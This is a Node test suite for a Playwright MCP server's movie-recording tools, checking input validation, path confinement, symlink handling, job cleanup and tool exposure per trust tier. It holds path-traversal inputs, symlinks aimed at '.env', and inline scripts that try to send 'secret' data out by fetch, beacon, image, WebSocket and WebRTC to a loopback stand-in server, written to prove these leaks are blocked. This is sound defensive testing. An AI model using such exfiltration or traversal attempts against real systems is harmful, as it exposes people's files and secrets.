#!/usr/bin/env node
// T1 acceptance — the movie_* tools (src/movie.ts, src/tools/movie.ts).
//
// Level: unit + narrow integration. Validation, path confinement, job cleanup and
// ffmpeg capability parsing run against dist/ with real temp dirs and a real
// loopback socket (hermetic: 127.0.0.1 only). Nothing is doubled except the ffmpeg
// `-encoders` text, which is fed in as a recorded string so the gate never depends
// on what ffmpeg this host has. The one real-chromium recording is opt-in behind
// PLAYWRIGHT_MCP_TEST_BROWSER=1, like test-browser-lifecycle.mjs.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import dgram from 'node:dgram';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = fs.mkdtempSync(path.join(os.tmpdir(), 'pwmcp-movie-test-'));
process.env.PLAYWRIGHT_MCP_MOVIES = path.join(ROOT, 'movies');

const m = await import('../dist/movie.js');
const { createOutwardServer } = await import('../dist/index.js');
const { Client } = await import('@modelcontextprotocol/sdk/client/index.js');
const { InMemoryTransport } = await import('@modelcontextprotocol/sdk/inMemory.js');

const FX = path.join(path.dirname(fileURLToPath(import.meta.url)), 'fixtures', 'movie');
const BROWSER_TESTS = process.env.PLAYWRIGHT_MCP_TEST_BROWSER === '1';

test.after(() => fs.rmSync(ROOT, { recursive: true, force: true }));

// ── ids and the step vocabulary ───────────────────────────────────────────────

test('checkSlug: job ids are a dot-free slug, so no traversal or hidden names', () => {
  assert.equal(m.checkSlug('job', 'seat-editor_demo2'), 'seat-editor_demo2');
  for (const bad of ['', '..', '../x', 'a/b', '.hidden', 'a.b', '-lead', 'x'.repeat(65), 'a b', 'a\0b', 42, null])
    assert.throws(() => m.checkSlug('job', bad), /job must be/, String(bad));
});

test('parseSteps: accepts the closed vocabulary and normalises it', () => {
  const steps = m.parseSteps([
    { action: 'navigate', url: '/x' },
    { action: 'click', target: '#a', caption: 'hi', highlight: true, highlightStyle: 'spotlight', holdMs: 100 },
    { action: 'type', target: 'input', text: 'abc' },
    { action: 'press', key: 'Enter' },
    { action: 'wait', ms: 10 },
    { action: 'scroll', dy: 300 },
    { action: 'hover', target: '#b', optional: true },
  ]);
  assert.equal(steps.length, 7);
  assert.equal(steps[1].highlightStyle, 'spotlight');
});

test('parseSteps: refuses anything outside the vocabulary (no eval, no upload, no stray keys)', () => {
  const cases = [
    [[{ action: 'evaluate', target: 'x' }], /action must be one of/],
    [[{ action: 'upload', target: 'x' }], /action must be one of/],
    [[{ action: 'click', target: '#a', script: 'alert(1)' }], /unknown field "script"/],
    [[{ action: 'click' }], /needs a target/],
    [[{ action: 'wait' }], /wait needs ms or a target/],
    [[{ action: 'wait', ms: 60_000 }], /ms must be a number/],
    [[{ action: 'hover', highlight: true }], /needs a target/],
    [[{ action: 'click', target: '#a', highlightStyle: 'glow' }], /highlightStyle/],
    [[], /non-empty array/],
    [Array.from({ length: 61 }, () => ({ action: 'wait', ms: 1 })), /limit is 60/],
  ];
  for (const [raw, re] of cases) assert.throws(() => m.parseSteps(raw), re);
});

test('parseTargets / parseViewports / parseSchemes: one source per target, bounded matrices', () => {
  assert.deepEqual(m.parseTargets([{ label: 'after', file: '/x/a.html' }]), [{ label: 'after', file: '/x/a.html' }]);
  assert.throws(() => m.parseTargets([{ label: 'a', url: 'http://x', file: '/a.html' }]), /exactly one/);
  assert.throws(() => m.parseTargets([{ label: 'a', url: 'file:///etc/passwd' }]), /http\(s\)/);
  assert.throws(() => m.parseTargets([{ label: 'a', file: '/etc/passwd' }]), /\.html/);
  assert.throws(() => m.parseTargets([{ label: 'a', html: '<p>' }, { label: 'a', html: '<p>' }]), /duplicate/);
  assert.throws(() => m.parseTargets([{ label: '../a', html: '<p>' }]), /target label/);
  assert.deepEqual(m.parseViewports(['phone']).map((v) => v.width), [390]);
  assert.equal(m.parseViewports(undefined)[0].name, 'desktop');
  assert.throws(() => m.parseViewports([{ name: 'huge', width: 9000, height: 100 }]), /240 to 1920/);
  assert.throws(() => m.parseViewports(['watch']), /unknown viewport/);
  assert.deepEqual(m.parseSchemes(['dark', 'dark', 'light']), ['dark', 'light']);
  assert.throws(() => m.parseSchemes(['sepia']), /light/);
});

// ── the loopback server's confinement ─────────────────────────────────────────

function mockupTree() {
  const dir = fs.mkdtempSync(path.join(ROOT, 'mock-'));
  const outside = fs.mkdtempSync(path.join(ROOT, 'outside-'));
  fs.writeFileSync(path.join(dir, 'index.html'), '<h1>ok</h1>');
  fs.writeFileSync(path.join(dir, '.env'), 'SECRET=1');
  fs.mkdirSync(path.join(dir, '.git'));
  fs.writeFileSync(path.join(dir, '.git', 'x.html'), 'no');
  fs.writeFileSync(path.join(dir, 'notes.md'), 'unknown extension');
  fs.writeFileSync(path.join(outside, 'secret.html'), 'escaped');
  fs.symlinkSync(path.join(outside, 'secret.html'), path.join(dir, 'link.html'));
  // In-root symlinks whose NAME passes but whose target is hidden or an unlisted type.
  fs.symlinkSync(path.join(dir, '.env'), path.join(dir, 'dotlink.html'));
  fs.symlinkSync(path.join(dir, 'notes.md'), path.join(dir, 'mdlink.html'));
  return { dir: fs.realpathSync(dir), outside };
}

test('resolveServed: only non-hidden files with a known type, inside the resolved root', () => {
  const { dir } = mockupTree();
  assert.equal(m.resolveServed(dir, '/index.html?x=1'), path.join(dir, 'index.html'));
  for (const bad of ['/.env', '/.git/x.html', '/../outside/secret.html', '/%2e%2e/x.html', '/link.html', '/dotlink.html', '/mdlink.html', '/notes.md', '/', '/a%5c..%5cb.html', '/%00.html'])
    assert.equal(m.resolveServed(dir, bad), null, bad);
});

const get = (url) =>
  new Promise((resolve, reject) =>
    http.get(url, (res) => {
      let body = '';
      res.on('data', (d) => (body += d));
      res.on('end', () => resolve({ status: res.statusCode, body, type: res.headers['content-type'] }));
    }).on('error', reject),
  );

test('serveDir: serves the mock-up on 127.0.0.1 and 404s what it must not serve', async () => {
  const { dir } = mockupTree();
  const s = await m.serveDir(dir);
  try {
    assert.match(s.origin, /^http:\/\/127\.0\.0\.1:\d+$/);
    const ok = await get(`${s.origin}/index.html`);
    assert.equal(ok.status, 200);
    assert.match(ok.type, /text\/html/);
    assert.equal(ok.body, '<h1>ok</h1>');
    for (const p of ['/.env', '/link.html', '/../../etc/passwd'])
      assert.equal((await get(`${s.origin}${p}`)).status, 404, p);
  } finally {
    await s.close();
  }
});

test('serveDir: refuses the home directory and the filesystem root', async () => {
  await assert.rejects(() => m.serveDir(os.homedir()), /refusing to serve/);
  await assert.rejects(() => m.serveDir('/'), /refusing to serve/);
});

// ── ffmpeg capabilities ───────────────────────────────────────────────────────

// Recorded from Playwright's bundled ffmpeg-1011 and from an Arch ffmpeg 7 build.
const BUNDLED_ENCODERS = ' VF...D png                  PNG (Portable Network Graphics) image\n V....D libvpx               libvpx VP8 (codec vp8)\n';
const BUNDLED_FILTERS = ' ... pad               V->V       Pad the input video.\n ..C scale             V->V       Scale the input video size\n';
const SYSTEM_ENCODERS = BUNDLED_ENCODERS + ' V....D gif                  GIF (Graphics Interchange Format)\n V....D libx264              libx264 H.264 / AVC\n';
const SYSTEM_FILTERS = BUNDLED_FILTERS + ' ... hstack            N->V       Stack video inputs horizontally.\n';

test('parseCaps: the bundled ffmpeg can do none of mp4/gif/side-by-side; a full build can', () => {
  assert.deepEqual(m.parseCaps(BUNDLED_ENCODERS, BUNDLED_FILTERS), { h264: false, h264Encoder: undefined, gif: false, vp8: true, hstack: false });
  assert.deepEqual(m.parseCaps(SYSTEM_ENCODERS, SYSTEM_FILTERS), { h264: true, h264Encoder: 'libx264', gif: true, vp8: true, hstack: true });
  // A distro that ships openh264 instead of x264 still gets mp4, through the encoder it has.
  const openh264 = BUNDLED_ENCODERS + ' V....D libopenh264          OpenH264 H.264 / AVC\n';
  assert.equal(m.parseCaps(openh264, BUNDLED_FILTERS).h264Encoder, 'libopenh264');
});

test('whichSync: ignores relative PATH entries (no cwd-planted ffmpeg)', () => {
  const bin = fs.mkdtempSync(path.join(ROOT, 'bin-'));
  const exe = path.join(bin, 'fakeff');
  fs.writeFileSync(exe, '#!/bin/sh\n', { mode: 0o755 });
  assert.equal(m.whichSync('fakeff', `.${path.delimiter}${bin}`), exe);
  assert.equal(m.whichSync('fakeff', path.relative(process.cwd(), bin)), undefined);
});

// ── scripts and jobs on disk ──────────────────────────────────────────────────

test('saveScript / loadScript / listScripts round-trip, owner-only on disk', () => {
  m.saveScript('select-space', [{ action: 'click', target: '[data-space=W1]', caption: 'Pick one' }], 'demo');
  const back = m.loadScript('select-space');
  assert.equal(back.steps[0].target, '[data-space=W1]');
  assert.deepEqual(m.listScripts().map((s) => s.name), ['select-space']);
  if (process.platform !== 'win32') {
    const file = path.join(m.moviesRoot(), 'scripts', 'select-space.json');
    assert.equal(fs.statSync(file).mode & 0o077, 0);
    assert.equal(fs.statSync(m.moviesRoot()).mode & 0o077, 0);
  }
  assert.throws(() => m.loadScript('nope'), /no saved script/);
});

test('removeJob: deletes a real job folder, refuses a symlinked or foreign one', () => {
  const real = m.jobDir('done-job', true);
  fs.writeFileSync(path.join(real, 'manifest.json'), '{}');
  fs.writeFileSync(path.join(real, 'a.webm'), 'x');
  const r = m.removeJob('done-job');
  assert.equal(r.removed, real);
  assert.equal(fs.existsSync(real), false);

  // A symlink planted under jobs/ must never lead the delete into its target.
  const victim = fs.mkdtempSync(path.join(ROOT, 'victim-'));
  fs.writeFileSync(path.join(victim, 'manifest.json'), '{}');
  fs.symlinkSync(victim, path.join(m.moviesRoot(), 'jobs', 'evil'));
  assert.throws(() => m.removeJob('evil'), /not a plain directory/);
  assert.equal(fs.existsSync(path.join(victim, 'manifest.json')), true);

  // A folder movie_record did not make (no manifest) is not removed either.
  m.jobDir('foreign', true);
  assert.throws(() => m.removeJob('foreign'), /no manifest\.json/);
  assert.throws(() => m.removeJob('../outside'), /job must be/);
  assert.throws(() => m.removeJob('never-made'), { code: 'ENOENT' });
});

// ── tier wiring ───────────────────────────────────────────────────────────────

test('movie_* are on the stdio surface and absent from every HTTP surface (ALWAYS_DENIED)', async () => {
  const upstream = { listTools: async () => ({ tools: [] }), callTool: async () => ({ content: [] }) };
  const names = async (trust) => {
    const server = createOutwardServer(() => upstream, [], { trust });
    const [c, s] = InMemoryTransport.createLinkedPair();
    await server.connect(s);
    const client = new Client({ name: 't', version: '0' });
    await client.connect(c);
    try {
      const listed = (await client.listTools()).tools.map((t) => t.name).filter((n) => n.startsWith('movie_'));
      const call = await client.callTool({ name: 'movie_clean', arguments: { job: 'x' } });
      return { listed, callText: call.content[0].text };
    } finally {
      await client.close();
    }
  };
  const stdio = await names('stdio');
  assert.deepEqual(stdio.listed.sort(), ['movie_clean', 'movie_list', 'movie_record', 'movie_script_list', 'movie_script_save']);
  for (const trust of ['local', 'cloud']) {
    const r = await names(trust);
    assert.deepEqual(r.listed, [], trust);
    assert.match(r.callText, /not available on the/, trust);
  }
});

// ── one real recording (opt-in) ───────────────────────────────────────────────

test(
  'recordMovie: a mock-up file becomes a webm + poster in the job folder, and movie_clean removes it',
  { skip: BROWSER_TESTS ? false : 'opt-in: needs a real chrome (PLAYWRIGHT_MCP_TEST_BROWSER=1)', timeout: 120_000 },
  async () => {
    const r = await m.recordMovie({
      job: 'browser-test',
      scriptName: 'inline',
      steps: m.parseSteps([
        { action: 'click', target: '[data-space=W2]', caption: 'Pick W2', holdMs: 100 },
        { action: 'click', target: '#confirm-short', highlight: true, holdMs: 100 },
        { action: 'click', target: '#not-in-this-page', optional: true, holdMs: 0 },
      ]),
      targets: [{ label: 'mockup', file: path.join(FX, 'seat-editor.html') }],
      viewports: [m.VIEWPORT_PRESETS.phone],
      schemes: ['dark'],
    });
    const [clip] = r.clips;
    assert.equal(clip.error, undefined);
    assert.equal(clip.steps, 2);
    assert.equal(clip.skipped.length, 1);
    assert.ok(fs.statSync(clip.webm).size > 1000);
    assert.ok(fs.statSync(clip.poster).size > 1000);
    assert.equal(m.describeJob('browser-test').clips.length, 1);
    m.removeJob('browser-test');
    assert.equal(fs.existsSync(r.dir), false);
  },
);

test(
  'recordMovie: a mock-up cannot reach the network over WebRTC, even with an iframe\'s fresh RTCPeerConnection',
  { skip: BROWSER_TESTS ? false : 'opt-in: needs a real chrome (PLAYWRIGHT_MCP_TEST_BROWSER=1)', timeout: 120_000 },
  async () => {
    // A UDP socket stands in for a STUN server; any binding request that reaches it is a leak.
    let packets = 0;
    const udp = dgram.createSocket('udp4');
    udp.on('message', () => (packets += 1));
    await new Promise((r) => udp.bind(0, '127.0.0.1', r));
    const port = udp.address().port;
    const html = `<p id=done></p><script>
      const f = document.createElement('iframe');
      document.body.appendChild(f);
      const PC = window.RTCPeerConnection || f.contentWindow.RTCPeerConnection;
      document.title = PC ? 'pc-recovered' : 'pc-gone';
      try {
        const pc = new PC({ iceServers: [{ urls: 'stun:127.0.0.1:${port}' }] });
        pc.createDataChannel('x');
        pc.createOffer().then((o) => pc.setLocalDescription(o));
      } catch {}
      setTimeout(() => (document.getElementById('done').textContent = 'done'), 2500);
    </script>`;
    try {
      const r = await m.recordMovie({
        job: 'webrtc-test',
        scriptName: 'inline',
        steps: m.parseSteps([{ action: 'wait', target: 'text=done', holdMs: 300 }]),
        targets: [{ label: 'mockup', html }],
        viewports: [m.VIEWPORT_PRESETS.phone],
        schemes: ['light'],
      });
      assert.equal(r.clips[0].error, undefined);
      assert.equal(packets, 0, 'no STUN packet left the browser');
      m.removeJob('webrtc-test');
    } finally {
      udp.close();
    }
  },
);

test(
  'recordMovie: a mock-up runs offline — no fetch, beacon, image or WebSocket leaves its loopback origin',
  { skip: BROWSER_TESTS ? false : 'opt-in: needs a real chrome (PLAYWRIGHT_MCP_TEST_BROWSER=1)', timeout: 120_000 },
  async () => {
    // A second loopback server stands in for "the internet": hermetic, and it counts what reaches it.
    let hits = 0;
    const outside = http.createServer((req, res) => {
      hits += 1;
      res.end('leaked');
    });
    outside.on('upgrade', (_req, socket) => {
      hits += 1;
      socket.destroy();
    });
    await new Promise((r) => outside.listen(0, '127.0.0.1', r));
    const ext = `127.0.0.1:${outside.address().port}`;
    const html = `<p id=own></p><script>
      fetch('index.html').then((r) => (document.getElementById('own').textContent = r.ok ? 'own-ok' : 'own-no'));
      fetch('http://${ext}/fetch?d=secret').catch(() => {});
      navigator.sendBeacon('http://${ext}/beacon', 'secret');
      new Image().src = 'http://${ext}/img.png';
      try { new WebSocket('ws://${ext}/ws'); } catch {}
    </script>`;
    try {
      const r = await m.recordMovie({
        job: 'offline-test',
        scriptName: 'inline',
        steps: m.parseSteps([{ action: 'wait', target: 'text=own-ok', holdMs: 800 }]),
        targets: [{ label: 'mockup', html }],
        viewports: [m.VIEWPORT_PRESETS.phone],
        schemes: ['light'],
      });
      assert.equal(r.clips[0].error, undefined, 'the mock-up still reaches its own server');
      assert.equal(hits, 0, 'nothing reached the outside server');
      m.removeJob('offline-test');
    } finally {
      await new Promise((r) => outside.close(r));
    }
  },
);

test('SHARE_HINT: movie results tell a session to share clips in the existing artifact, or a new one in the full house style', async () => {
  const { SHARE_HINT } = await import('../dist/tools/movie.js');
  const { MOVIE_PAGE_TEMPLATE } = await import('../dist/movie.js');
  for (const must of ['Artifact', 'never Claude Docs', 'ALREADY HAS', 'publish with its url', "match that page's own layout",
    'CREATING A NEW ONE', 'table of contents', 'contents rail', 'section 00', 'shared-artifact skill if it is available',
    MOVIE_PAGE_TEMPLATE, 'floor is the minimum', 'data-theme="dark"', 'files', '"contentType": "video/mp4"', 'video/webm',
    'no asset:true', '64 MB', '<video', 'CLEANUP IS REQUIRED', 'scope "files"', 'video/*',
    'LIFECYCLE: record, upload to the shareable artifact, confirm the files landed, then movie_clean',
    'uploading is how a movie job is cleaned up', 'discarding a bad take', 'you must call movie_clean({job})', 'delete any local copies', 'Never clean before step 2 succeeds', 'if a publish failed, keep the files'])
    assert.ok(SHARE_HINT.includes(must), must);
  assert.ok(path.isAbsolute(MOVIE_PAGE_TEMPLATE), 'the share line gives an absolute template path');
  const at = (x) => SHARE_HINT.indexOf(x);
  assert.ok(at('publish or update the artifact') < at('scope "files"') && at('scope "files"') < at('movie_clean({job})'),
    'order: publish, then verify the files listing, then movie_clean');
  assert.doesNotMatch(SHARE_HINT, /movie_clean is safe/, 'cleanup is required, not merely safe');
  const { movieCleanTool } = await import('../dist/tools/movie.js');
  assert.match(movieCleanTool.definition.description, /uploaded to the shareable artifact[\s\S]*discard a bad take/, 'movie_clean describes the one lifecycle');
  assert.doesNotMatch(movieCleanTool.definition.description, /once the job is complete/);
});

/** `<!-- name: N -->` marker value, or undefined. */
const marker = (text, name) => text.match(new RegExp(`<!--\\s*${name}:\\s*(\\S+)\\s*-->`))?.[1];

test('movie-page template: ships in the package with the full house style and the movie blocks', async () => {
  const { MOVIE_PAGE_TEMPLATE } = await import('../dist/movie.js');
  const repo = path.resolve(fileURLToPath(import.meta.url), '..', '..');
  assert.equal(MOVIE_PAGE_TEMPLATE, path.join(repo, 'templates', 'movie-page', 'index.html'), 'resolved from the installed package');
  assert.ok(fs.existsSync(MOVIE_PAGE_TEMPLATE), MOVIE_PAGE_TEMPLATE);
  const t = fs.readFileSync(MOVIE_PAGE_TEMPLATE, 'utf8');
  for (const [what, re] of [
    ['title placeholder', /<title>[A-Z][A-Z ]+<\/title>/],
    ['token block', /:root\s*\{\s*--bg:/],
    ['guarded prefers-color-scheme dark block', /@media \(prefers-color-scheme: dark\)\s*\{\s*:root:not\(\[data-theme="light"\]\)/],
    ['explicit data-theme dark block', /:root\[data-theme="dark"\]\s*\{/],
    ['body background', /body\s*\{[^}]*background:\s*var\(--bg\)/],
    ['contents rail', /<nav class="toc"[^>]*>[\s\S]*<a href="#glance"><span>00<\/span>At a glance<\/a>/],
    ['sticky rail', /nav\.toc\s*\{[^}]*position:\s*sticky/],
    ['rail highlight script, no IntersectionObserver', /<script id="rail-highlight">[\s\S]*innerHeight \* 0\.3/],
    ['section chips', /<span class="sec-num">01<\/span>/],
    ['case-file strip', /<dl class="case">[\s\S]*<dt>Target<\/dt>[\s\S]*<dt>Viewport<\/dt>[\s\S]*<dt>Scheme<\/dt>[\s\S]*<dt>Duration<\/dt>/],
    ['video, webm then mp4', /<video controls preload="metadata" poster="[^"]+">\s*<source src="[^"]+\.webm" type="video\/webm">\s*<source src="[^"]+\.mp4" type="video\/mp4">/],
    ['visible caption', /<\/video>\s*<figcaption>/],
  ])
    assert.match(t, re, what);
  assert.doesNotMatch(t.replace(/<!--[\s\S]*?-->/g, ''), /IntersectionObserver\(/, 'the rail script never builds an IntersectionObserver');
  // Every rail href has a section, so the highlight script can find each one.
  for (const [, id] of t.matchAll(/<li><a href="#([^"]+)">/g)) assert.match(t, new RegExp(`<section id="${id}">`), `section #${id}`);
  assert.equal(marker(t, 'shared-artifact-ref-version'), '1');
  assert.equal(marker(t, 'shared-artifact-template-version'), '1');
});

// Drift alarm, not a dependency: when the shared-artifact skill is installed, the starter's two
// markers must match its house-style.md and template.html. Each comparison is skipped on its own
// when that file is absent (playwright-mcp ships without claude-workforce).
for (const [file, name] of [['house-style.md', 'shared-artifact-ref-version'], ['template.html', 'shared-artifact-template-version']]) {
  const src = path.join(os.homedir(), '.claude', 'skills', 'shared-artifact', 'references', file);
  test(`movie-page template: ${name} matches the installed shared-artifact ${file}`, { skip: !fs.existsSync(src) && `${src} absent` }, async () => {
    const { MOVIE_PAGE_TEMPLATE } = await import('../dist/movie.js');
    const theirs = marker(fs.readFileSync(src, 'utf8'), name);
    assert.ok(theirs, `${src} carries no ${name} marker`);
    assert.equal(marker(fs.readFileSync(MOVIE_PAGE_TEMPLATE, 'utf8'), name), theirs,
      `${file} moved to ${name} ${theirs}: update templates/movie-page/index.html from it, then its marker`);
  });
}
